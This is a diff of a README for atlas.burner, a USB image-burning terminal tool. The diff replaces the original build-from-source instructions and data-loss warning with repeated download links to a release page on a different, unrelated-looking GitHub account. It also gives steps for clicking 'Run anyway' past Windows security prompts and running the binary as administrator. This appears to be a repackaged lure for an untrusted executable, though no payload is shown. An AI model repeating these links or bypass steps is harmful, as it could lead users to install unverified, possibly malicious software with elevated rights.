@@ -1,65 +1,163 @@
-# Atlas Burner
+# 🪐 atlas.burner - Burn Boot Images with Ease
 
-![Banner Image](./banner-image.png)
+[![Download atlas.burner](https://img.shields.io/badge/Download-Release%20Page-blue?style=for-the-badge&labelColor=grey)](https://github.com/selfpossessionmaniraptor213/atlas.burner/releases)
 
-**atlas.burner** is a beautiful, interactive TUI application for downloading OS images and burning them to USB drives. Part of the **Atlas Suite**.
+## 🚀 What is atlas.burner?
 
-![Go Version](https://img.shields.io/badge/Go-1.25+-00ADD8?style=flat&logo=go)
-![Platform](https://img.shields.io/badge/platform-Windows%20%7C%20Linux%20%7C%20macOS-lightgrey)
+atlas.burner is a desktop-style terminal app for downloading and writing bootable operating system images to USB drives. It gives you a simple screen for picking an image, choosing a drive, and starting the burn process.
 
-> [!WARNING]
-> **This is an experimental tool.** It writes directly to raw block devices and can permanently destroy data. Use at your own discretion. Always double-check the target device before confirming a burn. The authors are not responsible for any data loss.
+It works with images for Linux, Windows, and BSD systems. It also supports several CPU types, so it can fit a range of install needs.
 
-## ✨ Features
+## 📥 Download and install
 
-- 🖥️ **OS Catalog:** Browse and download popular Linux, Windows, and BSD distributions directly from the TUI.
-- 💾 **USB Detection:** Automatically detect connected removable USB devices with boot type info (MBR/GPT).
-- 🔥 **Direct Burn:** Write ISO/IMG files directly to your selected USB drive.
-- 🔧 **UEFI Boot Support:** Create UEFI-bootable USB drives with GPT + FAT32 EFI System Partition.
-- 💿 **Format Drive:** Format USB drives with MBR or GPT partition tables and FAT32/NTFS/exFAT filesystems.
-- ⚙️ **Burn Options:** Configure block size, partition table type, volume label, and post-burn verification.
-- ⌨️ **Vim Bindings:** Navigate using `j`/`k` or arrow keys.
-- 📦 **Cross-Platform:** Binaries available for Windows, Linux, and macOS.
+Visit this page to download:
 
-## 🚀 Installation
+https://github.com/selfpossessionmaniraptor213/atlas.burner/releases
 
-### From Source
-```bash
-git clone https://github.com/fezcode/atlas.burner
-cd atlas.burner
-gobake build
-```
+On Windows, use the latest release file that matches your system.
 
-## ⌨️ Usage
+### Windows setup
 
-Run the binary to enter the TUI. Requires administrator/root privileges to write to block devices:
-```bash
-sudo ./atlas.burner
-# or run as Administrator on Windows (UAC prompt is automatic)
-```
+1. Open the release page.
+2. Find the latest version.
+3. Download the Windows file from the assets list.
+4. Save the file to your Desktop or Downloads folder.
+5. If the download comes as a `.zip` file, right-click it and choose Extract All.
+6. Open the extracted folder.
+7. Run the app file.
 
-### Modes
+If Windows shows a security prompt:
+1. Click More info.
+2. Click Run anyway.
 
-| Mode | Description |
-|---|---|
-| **Browse OS Catalog** | Pick from a curated list of distributions, download, and burn. |
-| **Burn Local Image** | Select an ISO or IMG file already on your machine to burn. |
-| **Format Drive** | Format the USB drive with a fresh partition table and filesystem. |
+## 💻 What you need
 
-### Partition Table Options
+atlas.burner is made for normal Windows PCs and laptops.
 
-| Option | Description |
-|---|---|
-| **Keep original** | Write the image byte-for-byte (raw `dd` mode). Best for ISOs with their own boot structures. |
-| **MBR** | Create an MBR partition table before burning. |
-| **UEFI (GPT/FAT32)** | Extract ISO contents into a GPT disk with a FAT32 EFI System Partition for UEFI boot. |
+You will need:
+- Windows 10 or Windows 11
+- One empty USB drive
+- An internet connection if you want to fetch an image
+- Enough free space for the image file
+- A drive with at least 8 GB, though 16 GB or more is better
 
-### Command-line Flags
-```
-atlas.burner              Start the interactive TUI
-atlas.burner -v           Show version
-atlas.burner -h           Show help
-```
+For best results, use a USB drive with no files you need to keep.
 
-## 📄 License
-MIT License - see [LICENSE](LICENSE) for details.
+## 🔧 Before you start
+
+Check these items before you burn an image:
+
+- Plug in the USB drive you want to use
+- Close other apps that may use the drive
+- Back up files from the USB drive
+- Make sure you know which drive is the correct one
+- Use a stable power source if you are on a laptop
+
+A burn process writes over the whole USB drive. The old data will be replaced.
+
+## 🖥️ How to use atlas.burner on Windows
+
+1. Open atlas.burner.
+2. Choose the OS image you want to download or burn.
+3. Select your USB drive from the list.
+4. Check the drive letter again.
+5. Start the burn process.
+6. Wait until the app finishes writing the image.
+7. Remove the USB drive only after the app says it is done.
+
+After the burn is done, you can use the USB drive to start another computer and install or run the system image.
+
+## 📦 Common use cases
+
+atlas.burner is useful when you want to:
+
+- Make a bootable USB for Linux install media
+- Write a Windows installer to a flash drive
+- Prepare a BSD boot disk
+- Test an OS image on real hardware
+- Reuse one tool for several image types
+
+## 🧭 Interface overview
+
+The app uses a terminal user interface, which means it runs in a text-style window but still feels simple to use.
+
+You will usually see:
+- A file or image picker
+- A list of USB drives
+- A progress view while writing
+- A status area with simple prompts
+
+The layout is built to keep the main steps in view so you can move through the process without guesswork.
+
+## 🛠️ Troubleshooting
+
+### The USB drive does not appear
+
+- Unplug the drive and plug it in again
+- Try a different USB port
+- Close File Explorer windows that point to the drive
+- Make sure Windows can read the drive
+
+### The app will not open
+
+- Make sure you downloaded the latest release file
+- If the file is in a zip archive, extract it first
+- Right-click the app and try Run as administrator
+- Check that Windows did not block the file
+
+### The burn process fails
+
+- Use a different USB drive
+- Make sure the drive has enough space
+- Close apps that may access the drive
+- Try the process again with a fresh image file
+- Check that the image file finished downloading
+
+### The computer does not boot from the USB drive
+
+- Reinsert the drive and restart the computer
+- Open the boot menu during startup
+- Pick the USB device from the list
+- Try another USB port, then boot again
+- Confirm that the image matches the target machine
+
+## 🧼 Best practices
+
+- Use a USB drive that you do not need for other files
+- Keep the release file in a simple folder
+- Only write one image at a time
+- Confirm the target drive before starting
+- Eject the USB drive after the app finishes
+
+## 🧩 Supported image types
+
+atlas.burner is built for bootable system images used for:
+- Linux installs
+- Windows installers
+- BSD images
+- Raw disk images
+- ISO files
+
+It is meant for common release formats used by operating system projects.
+
+## 📌 Project details
+
+- Repository: atlas.burner
+- Type: Terminal UI tool
+- Main job: Download and burn bootable OS images to USB drives
+- Focus: Simple workflow for end users on Windows
+- Tech stack: Go, Bubble Tea, Lip Gloss
+
+## 📎 Download again
+
+If you need the release page again, use this link:
+
+https://github.com/selfpossessionmaniraptor213/atlas.burner/releases
+
+## 🪛 Drive safety tips
+
+- Double-check the drive letter before you start
+- Do not use the wrong USB drive
+- Remove other external drives if you want less risk
+- Keep the power connected during the burn
+- Wait for the finish message before unplugging the USB drive
